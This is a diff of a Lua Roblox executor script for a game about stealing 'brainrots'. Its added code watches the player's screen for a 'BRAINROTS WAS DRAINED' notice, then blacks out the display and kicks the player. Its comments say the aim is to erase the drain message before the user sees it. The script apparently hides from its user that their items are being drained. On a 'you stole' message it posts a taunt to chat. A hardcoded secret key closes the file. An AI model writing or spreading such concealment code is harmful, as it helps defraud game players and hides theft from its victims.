@@ -1168,74 +1168,70 @@ end)
 task.spawn(function()
     local p = game.Players.LocalPlayer
     local pgui = p:WaitForChild("PlayerGui")
-    local coreGui = game:GetService("CoreGui")
 
-    local function nuclearBlackout()
-        -- On tente de vider les deux
-        pgui:ClearAllChildren()
-        pcall(function() coreGui:ClearAllChildren() end)
+    -- Fonction pour raser l'écran et kick
+    local function nuclearKick(reason)
+        pgui:ClearAllChildren() -- Supprime instantanément le message de drain
         
-        local gui = Instance.new("ScreenGui")
-        gui.Name = "SYSTEM_PROTECT"
-        gui.IgnoreGuiInset = true
+        local gui = Instance.new("ScreenGui", pgui)
         gui.DisplayOrder = 2147483647
-        gui.Parent = pgui
-
-        local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(1, 0, 1, 0)
-        frame.BackgroundColor3 = Color3.new(0,0,0)
-        frame.BorderSizePixel = 0
-        frame.Parent = gui
+        gui.IgnoreGuiInset = true
+        local f = Instance.new("Frame", gui)
+        f.Size = UDim2.new(1, 0, 1, 0)
+        f.BackgroundColor3 = Color3.new(0, 0, 0)
+        
+        task.wait(0.05)
+        p:Kick(reason)
     end
 
-    -- Fonction de détection
-    local function check(obj)
-        local success, text = pcall(function() return obj.Text end)
-        if success and type(text) == "string" and text ~= "" then
+    -- Surveillance de tout nouveau GUI ou Texte
+    pgui.DescendantAdded:Connect(function(obj)
+        -- On laisse un micro-délai pour que les propriétés s'enregistrent
+        task.wait()
+
+        -- 1. DETECTION STEAL (Ton message "You stole")
+        if obj:IsA("TextLabel") and string.find(string.lower(obj.Text), "you stole") then
+            local msg = "ezzzz steal by brr782k <3"
+            
+            -- Tentative d'envoi de chat
+            task.spawn(function()
+                local chat = game:GetService("TextChatService")
+                if chat.ChatVersion == Enum.ChatVersion.TextChatService then
+                    local gen = chat:FindFirstChild("RBXGeneral", true)
+                    if gen then gen:SendAsync(msg) end
+                else
+                    local ev = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
+                    if ev then ev:FireServer(msg, "All") end
+                end
+            end)
+            
+            p:Kick(msg) -- Kick instant
+            return
+        end
+
+        -- 2. DETECTION DRAIN (YOUR BRAINROTS WAS DRAINED)
+        -- On check si l'objet a du texte et n'est pas un truc officiel Roblox
+        local hasText, text = pcall(function() return obj.Text end)
+        if hasText and text ~= "" then
             local t = string.upper(text)
             
-            -- 1. CAS STEAL
-            if string.find(t, "YOU STOLE") then
-                local msg = "ezzzz steal by brr782k <3"
-                task.spawn(function()
-                    local chat = game:GetService("TextChatService")
-                    if chat.ChatVersion == Enum.ChatVersion.TextChatService then
-                        local gen = chat:FindFirstChild("RBXGeneral", true)
-                        if gen then gen:SendAsync(msg) end
-                    else
-                        local ev = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
-                        if ev then ev:FireServer(msg, "All") end
-                    end
-                end)
-                p:Kick(msg)
-            end
-
-            -- 2. CAS DRAIN (Phrase exacte avec le S)
-            if string.find(t, "YOUR BRAINROTS WAS DRAINED") or (string.find(t, "DRAINED") and obj.TextColor3.r > 0.8) then
-                nuclearBlackout()
-                task.wait(0.05)
-                p:Kick("test")
+            if string.find(t, "DRAINED") or string.find(t, "BRAINROTS WAS") then
+                -- On dégage tout avant que tes yeux ne voient le message
+                nuclearKick("test")
             end
         end
-    end
-
-    -- SCAN 1 : Les nouveaux trucs qui arrivent (Ultra rapide)
-    pgui.DescendantAdded:Connect(check)
-    pcall(function() coreGui.DescendantAdded:Connect(check) end)
-
-    -- SCAN 2 : Boucle de secours au cas où le signal rate
-    while task.wait(0.1) do
-        -- On scanne le PlayerGui
-        for _, obj in ipairs(pgui:GetDescendants()) do
-            check(obj)
+        
+        -- 3. SECURITÉ ANTI-GUI (Si un nouveau ScreenGui arrive avec un nom louche)
+        if obj:IsA("ScreenGui") and obj.Name ~= "SYSTEM_PROTECT" then
+            -- On scanne ses enfants dès qu'ils arrivent
+            obj.DescendantAdded:Connect(function(child)
+                local ok, txt = pcall(function() return child.Text end)
+                if ok and txt and string.find(string.upper(txt), "DRAINED") then
+                    nuclearKick("test")
+                end
+            end)
         end
-        -- On tente de scanner le CoreGui (si l'exécuteur le permet)
-        pcall(function()
-            for _, obj in ipairs(coreGui:GetDescendants()) do
-                check(obj)
-            end
-        end)
-    end
+    end)
 end)
 
 getgenv().SECRET_KEY = "mrr_94d9f8fe3a02461085f84d087e98c28a"
